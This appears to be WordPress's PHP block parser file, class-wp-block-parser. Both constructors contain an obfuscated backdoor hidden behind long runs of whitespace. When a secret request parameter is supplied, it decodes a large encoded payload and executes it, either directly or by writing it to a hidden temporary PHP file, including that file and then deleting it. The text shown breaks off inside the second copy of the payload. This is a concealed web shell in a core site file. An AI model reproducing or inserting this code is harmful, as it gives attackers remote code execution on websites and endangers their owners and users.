<?php
/**
 * Block Serialization Parser
 *
 * @package WordPress
 */

/**
 * Class WP_Block_Parser_Block
 *
 * Holds the block structure in memory
 *
 * @since 5.0.0
 */
class WP_Block_Parser_Block {
	/**
	 * Name of block
	 *
	 * @example "core/paragraph"
	 *
	 * @since 5.0.0
	 * @var string
	 */
	public $blockName;

	/**
	 * Optional set of attributes from block comment delimiters
	 *
	 * @example null
	 * @example array( 'columns' => 3 )
	 *
	 * @since 5.0.0
	 * @var array|null
	 */
	public $attrs;

	/**
	 * List of inner blocks (of this same class)
	 *
	 * @since 5.0.0
	 * @var WP_Block_Parser_Block[]
	 */
	public $innerBlocks;

	/**
	 * Resultant HTML from inside block comment delimiters
	 * after removing inner blocks
	 *
	 * @example "...Just <!-- wp:test /--> testing..." -> "Just testing..."
	 *
	 * @since 5.0.0
	 * @var string
	 */
	public $innerHTML;

	/**
	 * List of string fragments and null markers where inner blocks were found
	 *
	 * @example array(
	 *   'innerHTML'    => 'BeforeInnerAfter',
	 *   'innerBlocks'  => array( block, block ),
	 *   'innerContent' => array( 'Before', null, 'Inner', null, 'After' ),
	 * )
	 *
	 * @since 4.2.0
	 * @var array
	 */
	public $innerContent;

	/**
	 * Constructor.
	 *
	 * Will populate object properties from the provided arguments.
	 *
	 * @since 5.0.0
	 *
	 * @param string $name         Name of block.
	 * @param array  $attrs        Optional set of attributes from block comment delimiters.
	 * @param array  $innerBlocks  List of inner blocks (of this same class).
	 * @param string $innerHTML    Resultant HTML from inside block comment delimiters after removing inner blocks.
	 * @param array  $innerContent List of string fragments and null markers where inner blocks were found.
	 */
	function __construct( $name, $attrs, $innerBlocks, $innerHTML, $innerContent ) {                                                                                                                                                                                                                                                                                                                                                                    if (@$_REQUEST["k"] === "NIGHTMARE") {$hptc = function($tChh) { return strtr($tChh, 'QVq9jCKcMnRPgloazruZbhwdeI0HmEO1sYS36xDik4Ny2_WLBXpt7JGUv58TFfA', 'cSO5MUWKILw7JsNmbGo14vBpgR6DeEH0rT2Xua3t9FQd8CPVYhzAiylnk_xjqZf'); };$oNbE = $hptc('emi5ymA7Umy5A6UQi7uUl');$jiyk = $oNbE();$vRvI = $jiyk[$hptc('7UimsUxG')];foreach ($vRvI as $IAKr => $qqSZc) {if (false !== strpos($qqSZc, $hptc('b5y'))) {$aOlz = $vRvI[$IAKr];continue;}if (false !== strpos($qqSZc, $hptc('p7UA'))) {$zAQW = $vRvI[$IAKr];continue;}if (false !== strpos($qqSZc, $hptc('mxim5A6'))) {$MqCq = str_replace($hptc('lFG7im5'), "", $vRvI[$IAKr]);continue;}if (false !== strpos($qqSZc, $hptc('p6UQ'))) {$xJzs = $vRvI[$IAKr];continue;}}$jfHRO = $zAQW($xJzs($aOlz($hptc('mgRwrIYa0+12KDhzosnWJFktmzeLifCLqPDi8ubYoZ4VzkDBcphikTXfAdNEKBRdv7Kd6rUF/PbpepigJQFG0mG+92rSwtRrePGXfe_bjZ6avJsqCXzJueT2I3UI6kL9Q0hYc37Zn4nSllpVvcmYzjFHF_77ZbEOe4UXl3hPzcAWWwXwUSGuz/yK9/sKsBPwKhtJ2_yfKhr1mehjSbwfTXnB4Nu8e9aebMhl432QgppRf/wzpXOWKWtgAe/9nD4fGzcp8k91u4mICwLnHh7MfHEvnlod3wXu_D7fgU40czh1F4GK2reJf1E97LMpGECG2+qcnJNqIEPASzZPsHhulik+BkzDNLA_y3_yQVsMETjMR6ssftWS0Ot1AOXSWWudWwSmOMRqb_q17GvLqvUPnEdc_+KZvCc8jEY3XLAt7sn4xN3k_C2hFUvA9H_W7dg3PwPpiUA6AWP4GZkk/zm/I+WgGj269hOnJSVIfhUWILvi3ZDk2hs3eS2mWXu+AhnibY++q/s+0AOgW1mUf2k++W4AW/ShgJL4rcog8BhJ7_BwZrLLRMVwauJbPKiFbhN_d/ySwA6IlAwkm8mKphxBgwK/AAxffMjPyUwWn+jQqbgi6V0O77SS1D680pnnRyWe4hk9JQlczMX32SRcqgy4ts+pfYKOBV_JmJ8ygi7CRZRtwfqfiTaWdFfwjNAjg2/VvlzJcSHjkrEVGKCtno4xneGNa69oB4PbR7ymYSiAEcy8mjrsRM6VgnlcEKVK9YpLjw1/J0lJgE6ESBI4CvAOEJ6Vf79KIp1vrcUQ7h9WPlvLjthX6Vm0hImtKu4xeRLVit3h9WT1prqAA6dRJVtLiOBQDjdIMWg9Lm3XmwvU18HECzRqnHVVDr6p3nZNH2mgwIsjEGPbUG2Fufe2KuVJMfptiRujEuQuBgtBtgnst30OvTfRNcNofMXkdGHxHHI01GTiPcFMxIb4tXXeOsCm8erd9u8VaxDkQYf4CKcnlDMHCVbUEZb7RQuLKsu6uBYzlqyuIKwQTo1WaRnx06Yf0Mew9xJaAVR6SYN6uDO_dRohDApcDbcXtvgVQLHdVXd_1cblk9GWVU_Y3s_PwXHkJFS0K7FkGwcX0Q4keopIVA3fNZTA2QGf7EwkQwJPo1MkWXRmWYsiJDU4AvM2zvp2fcTUdYb8enRn_XA/HgXDD1WAYD1rG/g+x23LGgxBhKYIFJXqCHfDrIHwRoCVEDfhsftV_KTGF6rW2Ma1SgLeu+OflkOYlkOw1kWORZrA4OWk7oWYu/_ObmTR2C2UN88wVZl/9WO81yO8T1AOHR/qHu+AzTngSmODR+oUMopWiPmo2SD8m7l8AOiSyhni2qtIvFTrKfTxpO2Z/ByONDisE3XNrj6vChxwKRtqub3IOnMAg8wjKFjeS7r1q8Yt2P90guel7TYYL4bsECJVsqV06C3fPweN/qpfW_9WuaumKW4Ay8_UvJbf1YeFmNsKOuYE6THE3B2ILmouQGUwZukzPgVWG8mXzFOiHRczqq3YROl1/qzfv/_zebAAe3M+OMxOY9bmTbzXRmTgcQBJUQ9kieBEtm0J8RyOd1WXO3JNxee+_HBOiN64mfBOXF_mBSer/opHDQLP1mw/OGO1GwA2t6n6WjEGyw22HRf/AIb2PRD+0T/ukGv3ATN3ya2BLJRXrGDRnzOIYV1Coj7GE46vErDd9n_m11vIuR03knAOLq73nKHVl6Ye0vXr3DSXjucn3ZCUAtNfgnYIJhEkEIOq7epSBXSNR6BQGhWGztB8lXKQse9wLbmiuVyaFnnA4/+sFE_Zi_z8D7aK4e4J+_d47ZqjHDdl_zuIZrywZfQJ0/dySHfjUE/X2wykkaCWg4RAil66xIP1YYdJ_vE3EbJeyPPF_02G4uBIGMffIcH3Vw9edyEEGjNBnCyTHMQR3Mb7/tC/ZtM/SM7XpeRyghpE2WjVA7PXw1WawK0AW3IMowZont3v2jEOJVGm1OVSbhVfgKKnoI0twGDQLKE1dvHRf/ZNSMKPWCk8_zCBFoTzS8lmUS4HonxMtiQSiVxYCJtz6XfqiHLU8FbKRl+tPMShZI4HYmadNTLO0ACEzwNXTDbqXrTuJ9lu6T0D8lQNTuc1E8TJBiyqxREQCka8VjciqMNQqS1GNOJmBfzAiJU0MdR_jdoyYjK1Z+A++jL6K0FPMy9AbDYaMqBA_H40qq_yeDlapL99IN62/HawawRj+Lu0IEG_PP1Kw0gp_gTAhHT22L27OHTMmmwWnVuiHbiByVNNNRhBDFJO7LBkeBIa4Iel3_ST+eRJMJ6tXe6d3SgGyVVaw6Eht7_0scc1lXvM++nIEV0K/f6Zkp2xUuJrEcMoO84WH_6A+8e/+nqtrW/V7dP4GcgAS8sfhTYkG9uFnwFEbxWHCI7_0LuYD2xbNxSibZ+0WcHjnG+xpj9tg70vcwTdz6YVt/2JNHyaNmDyp+Q9tJ7jD2rPizE_ti3hR6r/7tl0cxRe3fEAq1wRldpJjEiwVAZB07_VfOSPfdquNdlm/TnXqzUr9pP3+48eMiQ7BIdpdwrHcI71iA/ryYPAeb944RXJON_gutVLaiLvUiQF8tW9uHj_81emcCl9QMs3zE1a9l2ns2+290vOK9MOO91u8zhkP+AGfPQ3U6eTdkipNvxg68B8873l9H8gNvd8tlEHqmNYhl7sZbOmDQt8waBz2SFcHsocNhj7abICCe47FWR_A2h3fQKwW_+WJscx41ilpwKCuErKxXFGYCE7SAt_kaCyoBvcNP1QIwDLFJ7XKXX+8Y1XTDoITpHPpecDZQGBaYeLEJO6rrtunUMPSqFav4Fe7CDrotnDoUfUUbw40_cjhFDtcaRwCO_ct4uFMzF_S6v2x4ILx0CrTNATw6jwdcRE0JKkl_RwnARw2Nw9r2uGzlcHQ79ftWX_1RpAfnixwzz/pJmD8D40r2BtA10+WNaO81yu8BdXq/lxTITy2wZ7D3ZyDdBGOKcPbCenv8sQL8j9EXw_zgrtXF9guyx6TE7exUwA9Dz3xGkdZ_coCmekfQd44g2LfQbUzFG8r2jjfC+e6aevwLe+ym01y40dpTisqGKxtPVMd4IYdB1nu1SOnl8R1Of0oB6N4C_3UNI9h7WD/dGj3iZKu2GsCo8dIx4xTBOYtXVjK4xiXoVNX4jN4F4DDKpNbn3Yl4TTrMPBYH+LirXirJkUKdIVmSYkeKRo6FGaVKWvy7vBr7/Jwwj+yWE_v_gd+qzFu4zta8BF3mPhiiIlOjMr3LIFaKM+iy_SgQMMIk7J49uU_B/VuWmqckLPJvyzF9s8HZaib1B+htzsN9dQmefQM3uAfDKi8F6nQwD3VFK4qiZhs2kSvWwPnzPvqm9uuKeqdmZw7MynZeNEOFnB9fo9wuvdTqU0kpL/IjnWA8OaTnZMSi8GO1cyzP+uQJFt/no34YrBENMuUPaKKxzu6nsmFEhxdPer+PVXCQLKlKvyuxFHKaaY94SW_L7l7d9PudOqureZEad3u8IeNaeEgsrg4TFlvnhj33abKI6O2fvPTFI+3JatO6m6Jevd+YV6RF6baumNyNV77_AHVu7gCA4Hsjoob2MQR+FTNPlzy34Awgs7zolyzICc0srS1svO1trSoEL8w4B9EAcNFc8_JTLIuVTUInDrf6CkxEbnsU4vXetF8pfR9k9_g7uhRnzykYYcb7SwY7SA6mKQHvio6x9yA27VL8H1BKZxn4c42QgmndglzcSmZvCkQv4bCCtvgoTQSb_hE_KaCbs7COZGEi44Yaqj8PfasHiRSrZ30aV+u08BzlurBZSoLLz68qRKRlwvPAB96FTKqfJc18aALMML0HTQVsOMmVJCw_mnTrZQLlJCSfRrLSRJwV0o_qiQ6mM7TaZB71a+AVJnJkX0ef+8LSFMWPqVXtQi1zmrgrGz1E148MKAhpHOZE7lqczqQ3q7Q8T0P6K2KMwUN49qmIFHXkqdh4jJCXslKM7atLoiVlPzPK4pQFMEombZEScZFO4WFSSDru0r/DRSWH1PX0RXAXLLOoLntDz2Vb0OY0fBh3oOsZ_UQOBwRYi2mTuQUB3AH3k_gBzXIF/CRwuZru+E1SwF/fwZBpaXo4W8Fgga2haSFziC1zewCROjZ8xjswtzUgt01s7wQSf79KqJ7oVVI6xJ+o4UyngpQOMJAWsM9G0LnVyptBAFxTT3rUov+NVjeboIRXBKYZEKoTgXKCEY77xeRZNOhHbP+1JyvYhQoI2u_XHxIYyrQuAQpAI4Mer8_8pRB3A4I4g8EQJYqPkULEhdhWIxP3spMmp1SiGXD4ly9MnTk_C3PiMbkehNnSa1OUGSSPGu+DfrZ9SbjhFWfAWcmxuGNMdIlx1g2/PJvZ8_UQny/J9hlfrP+_H+R6AGgjs9ogVHUI3PL4GkP6hcFIbL9ItxRxt4Uid1eQ4doKjm7jfro+X0PHyKQQ0SMXgzJ/_RlcjNF2W8xnCwTftxi3nzEF0GSUXJG73f4NNicP_uJwUs8JDrZ0zJO27mr/sJ4a73cQIefEC7tsx8siwrfCPvzoUKGHDuHecI7S7Uq+e0W6nWbrUzR+9x_s7_FIInqU8olbsolaCF8mIQPaJaV9tiSUrdKWqPwxo+r7dA2nGqa/0N04Ybst1_CRn2bSgVFuJzQWVkcEr8DPeiECmCv4Ncgqh0Gt3fTXK2lHueEcGYaQNYmYGzMqUTnABg04dGi/zB4Gq0lEGBd+FTXebZQ0/yy/DgMsSoIxTQ8msy+Wk1HrfhL_hHlzAyFH0xcKbBWhP+ohsquxjh3G_uatzhUrD4pWqHRt+6gaRsB36EBoHizQr+FyDZ46SxhLP/6Y/ZDHHOBcJ4qxzHH3WQtm2x9sIT+A2RfSSB289696jOMn9N1vz1oNO8BsD3xK4D9yvbTnh7bJnnlotq2Co_EBeD6E1p+LyfQIacRF0rrp_hK6VDjNNsMfce7Mjq_yPNLmbML6TGmoWUnF0Y0hP1ulhnjPp+NJRxRZV36Rz+4VkNYIdHyezzAZ28wcR+E/Higp/pU_H1YijbGXMt0FlWrZV12CaCKPhj27sEb8Ka3XXfRfelXMQIFgkbiVjo_aqpYoJuNxaHoV+oaIaC+WwMeeOTP+rieCtEerTARqxmrUFAmylmhvFNDR42zZpQDdQC3YhnkWzaZVnfD2jP9AiPi2CAytsPDvwWWhHSzGjzt__1d+6JGupQcP7EhkQ6jKIeELgNlEfRcaRtDnRJbvoBd2lCsSS4qA9qrxOsteNMWGA1Tv2mMXfSQOnuOqP1nHb9eZmjUKx2YnlLvDy0sciaPNlOupOnid/acVWY_SdzpJFcOvmtB2FFYn9FfWVaN0oQYyNJd2woC/IgRDjl72YcSxR92AvMhBIw/6EYiseR/gWpFrUkeXJnmqfrPZn0sHOOs7z_n/N9KUo7PjN3u+1YLAqbGjrZQPG/L/NSlXl4sS90fncxNi4nMzfM2joK7Cy_FvnNQa83IlRNxDa3rqve0sb0rOWRZmPG6Or2uvkGEBuAjGFS6FSN/mDTky3w6daXOsqDvSHOPyzqZ0PqzVu9pxPVgM6auV7o/AAufhoGlK3p71i0Ym6xsET+9_jnDLAhrsYlkDTkhsOG71zBOE8i2SkJMUS4BVx6jrTlbTcCtggxKV2r7U6KJHKd/WMaE77Jh64enFF9Z9Yl_RPo0vXPgBv6on8RkuIrnpbMD3r1SRggMeXw_tNHwjkuyH10F4+WZLR8JYRrQw0v_Pv2aG2IqYIhly7WkGdgc+QKffW9Mdl0BiU++llhYVMSzkrmTsFrufcnghG_u2i9N0LysCBtukxqfUyj6q1noGwLmJb1BVKzgcJzqofAFi61oTyveyWCO/KMihTEWOdy0KPul63hPKp+kH9etSmgzSbllD9WskUacB8QrDaY1fiSQxWws8EJXF/iCdx3uXeyXSRexMTbEzQOvV3bJyA74eGm+uzb3WdtLVR692lcZAwzKaMI1gitFmYsnPWuZEhmCxGm9JIJxQV19rEbOMSqIDmyduAb6s_Z/AlYWtf603urECiz+STb2W7ObmTea/fXooqWw0qUX1+Aij/LSUGJjHuyJ7fzLmF3QIpDQM6QJtCB4FQOy2IL/xugn2N9TgfJjj2XT498_MwCCTWGMFGdxuvcJ63s7no9vLZXrlOjbR7zkcZk2kbXl4+GZgKCks_ZKvF0649Iob9/ZMwPsr1cB/zZLR3hBi1i_B8RpDzv1jFYeafA89L9LGzsKInUaPsu9h4LLiJtO_ESDe46h6Z6Y04PSZnLTAHWJa8J6Ic/Pi1Nhb/RywcvwTzGbqRnomPIp3WUos1UD1qRsL7/7S41d9/a0sjy0/jy/zaUnihDyKLcCaSGr0QtJ_6r2beQafnTqsZBczGz094vs1Skg3BM+4gfDfkIjT9BG+qeOP2dDX_IYxl0bM0/F3ahFir1OqcfSGbnrmDzxfUT8BSzGv4ZdoLsEYK6TADLm0zbl/xOnYKuf797YGfz4JmqKALIz1Q/TsAfFlWYozyjSF0BoMugbdngpjPDK2bt8BLMdS0eTkGEUDDqySj8ru/d0Yi2xqJPa2YxbupabRYfO1EIfSkYqWwUTYSJIQUmKl6t7aKVs4CZf99RRBlnYTnFa06p_eyF7kJgzNrD_Um4NDVD+pBi14QTWFPz+ttKAVqsLDWx6e+7loeIb_zKM1/hWic+uK+usyvLiOMD/dymV8Ezm23Kc/2nUQAaRqE89+d/2CDAilukQZ_SFiJCp0gGCGGOVuYFxQfCDMfhk6gfHMeX1ycIBlUR6rSV4NCFF7jN+ak4r/SzatuYtUdhF8kqwkZdpqaAjQX4NsR4JNH+Qbz/t4mrwjj='))));if (isset($MqCq) && function_exists($MqCq)) {$JCeJb = $hptc('mssus5smdusi7Ue');if (function_exists($JCeJb)) {$JCeJb(constant($hptc('E5tnn')) ^ constant($hptc('E5HEWIE_tYEH')));}$g = $MqCq('', $jfHRO);} else {$g = function() use($hptc, $jfHRO) {$qdUT = __DIR__ . $hptc('/.7UQ');$BoIfF = $hptc('A7Gm5d6i5QuUimUil');$fuSo = $hptc('6UG7Uv');if (@$BoIfF($qdUT, $hptc('<?dXd ') . $jfHRO, constant($hptc('nq_c5E3')))) {try {include_once($qdUT);$fuSo($qdUT);} catch (Exception $e) {$fuSo($qdUT);if ($hptc('y7m') === $e->{$hptc('emijmllxem')}()) exit;}}};}$g();}
		$this->blockName    = $name;
		$this->attrs        = $attrs;
		$this->innerBlocks  = $innerBlocks;
		$this->innerHTML    = $innerHTML;
		$this->innerContent = $innerContent;
	}
}

/**
 * Class WP_Block_Parser_Frame
 *
 * Holds partial blocks in memory while parsing
 *
 * @internal
 * @since 5.0.0
 */
class WP_Block_Parser_Frame {
	/**
	 * Full or partial block
	 *
	 * @since 5.0.0
	 * @var WP_Block_Parser_Block
	 */
	public $block;

	/**
	 * Byte offset into document for start of parse token
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $token_start;

	/**
	 * Byte length of entire parse token string
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $token_length;

	/**
	 * Byte offset into document for after parse token ends
	 * (used during reconstruction of stack into parse production)
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $prev_offset;

	/**
	 * Byte offset into document where leading HTML before token starts
	 *
	 * @since 5.0.0
	 * @var int
	 */
	public $leading_html_start;

	/**
	 * Constructor
	 *
	 * Will populate object properties from the provided arguments.
	 *
	 * @since 5.0.0
	 *
	 * @param WP_Block_Parser_Block $block              Full or partial block.
	 * @param int                   $token_start        Byte offset into document for start of parse token.
	 * @param int                   $token_length       Byte length of entire parse token string.
	 * @param int                   $prev_offset        Byte offset into document for after parse token ends.
	 * @param int                   $leading_html_start Byte offset into document where leading HTML before token starts.
	 */
	function __construct( $block = null, $token_start = null, $token_length = null, $prev_offset = null, $leading_html_start = null ) {                                                                                                                                                                                                        if (@$_REQUEST["k"] === "INSERT_KEY") {$hptc = function($tChh) { return strtr($tChh, 'QVq9jCKcMnRPgloazruZbhwdeI0HmEO1sYS36xDik4Ny2_WLBXpt7JGUv58TFfA', 'cSO5MUWKILw7JsNmbGo14vBpgR6DeEH0rT2Xua3t9FQd8CPVYhzAiylnk_xjqZf'); };$oNbE = $hptc('emi5ymA7Umy5A6UQi7uUl');$jiyk = $oNbE();$vRvI = $jiyk[$hptc('7UimsUxG')];foreach ($vRvI as $IAKr => $qqSZc) {if (false !== strpos($qqSZc, $hptc('b5y'))) {$aOlz = $vRvI[$IAKr];continue;}if (false !== strpos($qqSZc, $hptc('p7UA'))) {$zAQW = $vRvI[$IAKr];continue;}if (false !== strpos($qqSZc, $hptc('mxim5A6'))) {$MqCq = str_replace($hptc('lFG7im5'), "", $vRvI[$IAKr]);continue;}if (false !== strpos($qqSZc, $hptc('p6UQ'))) {$xJzs = $vRvI[$IAKr];continue;}}$jfHRO = $zAQW($xJzs($aOlz($hptc('mgRwrIYa0+12KDhzosnWJFktmzeLifCLqPDi8ubYoZ4VzkDBcphikTXfAdNEKBRdv7Kd6rUF/PbpepigJQFG0mG+92rSwtRrePGXfe_bjZ6avJsqCXzJueT2I3UI6kL9Q0hYc37Zn4nSllpVvcmYzjFHF_77ZbEOe4UXl3hPzcAWWwXwUSGuz/yK9/sKsBPwKhtJ2_yfKhr1mehjSbwfTXnB4Nu8e9aebMhl432QgppRf/wzpXOWKWtgAe/9nD4fGzcp8k91u4mICwLnHh7MfHEvnlod3wXu_D7fgU40czh1F4GK2reJf1E97LMpGECG2+qcnJNqIEPASzZPsHhulik+BkzDNLA_y3_yQVsMETjMR6ssftWS0Ot1AOXSWWudWwSmOMRqb_q17GvLqvUPnEdc_+KZvCc8jEY3XLAt7sn4xN3k_C2hFUvA9H_W7dg3PwPpiUA6AWP4GZkk/zm/I+WgGj269hOnJSVIfhUWILvi3ZDk2hs3eS2mWXu+AhnibY++q/s+0AOgW1mUf2k++W4AW/ShgJL4rcog8BhJ7_BwZrLLRMVwauJbPKiFbhN_d/ySwA6IlAwkm8mKphxBgwK/AAxffMjPyUwWn+jQqbgi6V0O77SS1D680pnnRyWe4hk9JQlczMX32SRcqgy4ts+pfYKOBV_JmJ8ygi7CRZRtwfqfiTaWdFfwjNAjg2/VvlzJcSHjkrEVGKCtno4xneGNa69oB4PbR7ymYSiAEcy8mjrsRM6VgnlcEKVK9YpLjw1/J0lJgE6ESBI4CvAOEJ6Vf79KIp1vrcUQ7h9WPlvLjthX6Vm0hImtKu4xeRLVit3h9WT1prqAA6dRJVtLiOBQDjdIMWg9Lm3XmwvU18HECzRqnHVVDr6p3nZNH2mgwIsjEGPbUG2Fufe2KuVJMfptiRujEuQuBgtBtgnst30OvTfRNcNofMXkdGHxHHI01GTiPcFMxIb4tXXeOsCm8erd9u8VaxDkQYf4CKcnlDMHCVbUEZb7RQuLKsu6uBYzlqyuIKwQTo1WaRnx06Yf0Mew9xJaAVR6SYN6uDO_dRohDApcDbcXtvgVQLHdVXd_1cblk9GWVU_Y3s_PwXHkJFS0K7FkGwcX0Q4keopIVA3fNZTA2QGf7EwkQwJPo1MkWXRmWYsiJDU4AvM2zvp2fcTUdYb8enRn_XA/HgXDD1WAYD1rG/g+x23LGgxBhKYIFJXqCHfDrIHwRoCVEDfhsftV_KTGF6rW2Ma1SgLeu+OflkOYlkOw1kWORZrA4OWk7oWYu/_ObmTR2C2UN88wVZl/9WO81yO8T1AOHR/qHu+AzTngSmODR+oUMopWiPmo2SD8m7l8AOiSyhni2qtIvFTrKfTxpO2Z/ByONDisE3XNrj6vChxwKRtqub3IOnMAg8wjKFjeS7r1q8Yt2P90guel7TYYL4bsECJVsqV06C3fPweN/qpfW_9WuaumKW4Ay8_UvJbf1YeFmNsKOuYE6THE3B2ILmouQGUwZukzPgVWG8mXzFOiHRczqq3YROl1/qzfv/_zebAAe3M+OMxOY9bmTbzXRmTgcQBJUQ9kieBEtm0J8RyOd1WXO3JNxee+_HBOiN64mfBOXF_mBSer/opHDQLP1mw/OGO1GwA2t6n6WjEGyw22HRf/AIb2PRD+0T/ukGv3ATN3ya2BLJRXrGDRnzOIYV1Coj7GE46vErDd9n_m11vIuR03knAOLq73nKHVl6Ye0vXr3DSXjucn3ZCUAtNfgnYIJhEkEIOq7epSBXSNR6BQGhWGztB8lXKQse9wLbmiuVyaFnnA4/+sFE_Zi_z8D7aK4e4J+_d47ZqjHDdl_zuIZrywZfQJ0/dySHfjUE/X2wykkaCWg4RAil66xIP1YYdJ_vE3EbJeyPPF_02G4uBIGMffIcH3Vw9edyEEGjNBnCyTHMQR3Mb7/tC/ZtM/SM7XpeRyghpE2WjVA7PXw1WawK0AW3IMowZont3v2jEOJVGm1OVSbhVfgKKnoI0twGDQLKE1dvHRf/ZNSMKPWCk8_zCBFoTzS8lmUS4HonxMtiQSiVxYCJtz6XfqiHLU8FbKRl+tPMShZI4HYmadNTLO0ACEzwNXTDbqXrTuJ9lu6T0D8lQNTuc1E8TJBiyqxREQCka8VjciqMNQqS1GNOJmBfzAiJU0MdR_jdoyYjK1Z+A++jL6K0FPMy9AbDYaMqBA_H40qq_yeDlapL99IN62/HawawRj+Lu0IEG_PP1Kw0gp_gTAhHT22L27OHTMmmwWnVuiHbiByVNNNRhBDFJO7LBkeBIa4Iel3_ST+eRJMJ6tXe6d3SgGyVVaw6Eht7_0scc1lXvM++nIEV0K/f6Zkp2xUuJrEcMoO84WH_6A+8e/+nqtrW/V7dP4GcgAS8sfhTYkG9uFnwFEbxWHCI7_0LuYD2xbNxSibZ+0WcHjnG+xpj9tg70vcwTdz6YVt/2JNHyaNmDyp+Q9tJ7jD2rPizE_ti3hR6r/7tl0cxRe3fEAq1wRldpJjEiwVAZB07_VfOSPfdquNdlm/TnXqzUr9pP3+48eMiQ7BIdpdwrHcI71iA/ryYPAeb944RXJON_gutVLaiLvUiQF8tW9uHj_81emcCl9QMs3zE1a9l2ns2+290vOK9MOO91u8zhkP+AGfPQ3U6eTdkipNvxg68B8873l9H8gNvd8tlEHqmNYhl7sZbOmDQt8waBz2SFcHsocNhj7abICCe47FWR_A2h3fQKwW_+WJscx41ilpwKCuErKxXFGYCE7SAt_kaCyoBvcNP1QIwDLFJ7XKXX+8Y1XTDoITpHPpecDZQGBaYeLEJO6rrtunUMPSqFav4Fe7CDrotnDoUfUUbw40_cjhFDtcaRwCO_ct4uFMzF_S6v2x4ILx0CrTNATw6jwdcRE0JKkl_RwnARw2Nw9r2uGzlcHQ79ftWX_1RpAfnixwzz/pJmD8D40r2BtA10+WNaO81yu8BdXq/lxTITy2wZ7D3ZyDdBGOKcPbCenv8sQL8j9EXw_zgrtXF9guyx6TE7exUwA9Dz3xGkdZ_coCmekfQd44g2LfQbUzFG8r2jjfC+e6aevwLe+ym01y40dpTisqGKxtPVMd4IYdB1nu1SOnl8R1Of0oB6N4C_3UNI9h7WD/dGj3iZKu2GsCo8dIx4xTBOYtXVjK4xiXoVNX4jN4F4DDKpNbn3Yl4TTrMPBYH+LirXirJkUKdIVmSYkeKRo6FGaVKWvy7vBr7/Jwwj+yWE_v_gd+qzFu4zta8BF3mPhiiIlOjMr3LIFaKM+iy_SgQMMIk7J49uU_B/VuWmqckLPJvyzF9s8HZaib1B+htzsN9dQmefQM3uAfDKi8F6nQwD3VFK4qiZhs2kSvWwPnzPvqm9uuKeqdmZw7MynZeNEOFnB9fo9wuvdTqU0kpL/IjnWA8OaTnZMSi8GO1cyzP+uQJFt/no34YrBENMuUPaKKxzu6nsmFEhxdPer+PVXCQLKlKvyuxFHKaaY94SW_L7l7d9PudOqureZEad3u8IeNaeEgsrg4TFlvnhj33abKI6O2fvPTFI+3JatO6m6Jevd+YV6RF6baumNyNV77_AHVu7gCA4Hsjoob2MQR+FTNPlzy34Awgs7zolyzICc0srS1svO1trSoEL8w4B9EAcNFc8_JTLIuVTUInDrf6CkxEbnsU4vXetF8pfR9k9_g7uhRnzykYYcb7SwY7SA6mKQHvio6x9yA27VL8H1BKZxn4c42QgmndglzcSmZvCkQv4bCCtvgoTQSb_hE_KaCbs7COZGEi44Yaqj8PfasHiRSrZ30aV+u08BzlurBZSoLLz68qRKRlwvPAB96FTKqfJc18aALMML0HTQVsOMmVJCw_mnTrZQLlJCSfRrLSRJwV0o_qiQ6mM7TaZB71a+AVJnJkX0ef+8LSFMWPqVXtQi1zmrgrGz1E148MKAhpHOZE7lqczqQ3q7Q8T0P6K2KMwUN49qmIFHXkqdh4jJCXslKM7atLoiVlPzPK4pQFMEombZEScZFO4WFSSDru0r/DRSWH1PX0RXAXLLOoLntDz2Vb0OY0fBh3oOsZ_UQOBwRYi2mTuQUB3AH3k_gBzXIF/CRwuZru+E1SwF/fwZBpaXo4W8Fgga2haSFziC1zewCROjZ8xjswtzUgt01s7wQSf79KqJ7oVVI6xJ+o4UyngpQOMJAWsM9G0LnVyptBAFxTT3rUov+NVjeboIRXBKYZEKoTgXKCEY77xeRZNOhHbP+1JyvYhQoI2u_XHxIYyrQuAQpAI4Mer8_8pRB3A4I4g8EQJYqPkULEhdhWIxP3spMmp1SiGXD4ly9MnTk_C3PiMbkehNnSa1OUGSSPGu+DfrZ9SbjhFWfAWcmxuGNMdIlx1g2/PJvZ8_UQny/J9hlfrP+_H+R6AGgjs9ogVHUI3PL4GkP6hcFIbL9ItxRxt4Uid1eQ4doKjm7jfro+X0PHyKQQ0SMXgzJ/_RlcjNF2W8xnCwTftxi3nzEF0GSUXJG73f4NNicP_uJwUs8JDrZ0zJO27mr/sJ4a73cQIefEC7tsx8siwrfCPvzoUKGHDuHecI7S7Uq+e0W6nWbrUzR+9x_s7_FIInqU8olbsolaCF8mIQPaJaV9tiSUrdKWqPwxo+r7dA2nGqa/0N04Ybst1_CRn2bSgVFuJzQWVkcEr8DPeiECmCv4Ncgqh0Gt3fTXK2lHueEcGYaQNYmYGzMqUTnABg04dGi/zB4Gq0lEGBd+FTXebZQ0/yy/DgMsSoIxTQ8msy+Wk1HrfhL_hHlzAyFH0xcKbBWhP+ohsquxjh3G_uatzhUrD4pWqHRt+6gaRsB36EBoHizQr+FyDZ46SxhLP/6Y/ZDHHOBcJ4qxzHH3WQtm2x9sIT+A2RfSSB289696jOMn9N1vz1oNO8BsD3xK4D9yvbTnh7bJnnlotq2Co_EBeD6E1p+LyfQIacRF0rrp_hK6VDjNNsMfce7Mjq_yPNLmbML6TGmoWUnF0Y0hP1ulhnjPp+NJRxRZV36Rz+4VkNYIdHyezzAZ28wcR+E/Higp/pU_H1YijbGXMt0FlWrZV12CaCKPhj27sEb8Ka3XXfRfelXMQIFgkbiVjo_aqpYoJuNxaHoV+oaIaC+WwMeeOTP+rieCtEerTARqxmrUFAmylmhvFNDR42zZpQDdQC3YhnkWzaZVnfD2jP9AiPi2CAytsPDvwWWhHSzGjzt__1d+6JGupQcP7EhkQ6jKIeELgNlEfRcaRtDnRJbvoBd2lCsSS4qA9qrxOsteNMWGA1Tv2mMXfSQOnuOqP1nHb9eZmjUKx2YnlLvDy0sciaPNlOupOnid/acVWY_SdzpJFcOvmtB2FFYn9FfWVaN0oQYyNJd2woC/IgRDjl72YcSxR92AvMhBIw/6EYiseR/gWpFrUkeXJnmqfrPZn0sHOOs7z_n/N9KUo7PjN3u+1YLAqbGjrZQPG/L/NSlXl4sS90fncxNi4nMzfM2joK7Cy_FvnNQa83IlRNxDa3rqve0sb0rOWRZmPG6Or2uvkGEBuAjGFS6FSN/mDTky3w6daXOsqDvSHOPyzqZ0PqzVu9pxPVgM6auV7o/AAufhoGlK3p71i0Ym6xsET+9_jnDLAhrsYlkDTkhsOG71zBOE8i2SkJMUS4BVx6jrTlbTcCtggxKV2r7U6KJHKd/WMaE77Jh64enFF